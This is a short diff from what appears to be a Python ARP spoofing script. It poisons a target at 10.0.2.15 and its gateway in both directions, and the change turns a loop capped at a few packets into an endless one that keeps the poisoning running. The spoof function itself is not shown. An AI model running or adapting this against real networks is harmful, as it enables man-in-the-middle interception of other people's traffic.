@@ -29,8 +29,8 @@ target_ip = "10.0.2.15"
 gateway_ip = "10.0.2.1"
 
 try:
-    pckt_sent = 0
-    while pckt_sent < 6:
+    pckt_sent = 1
+    while pckt_sent:
         pckt_sent = pckt_sent+2
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
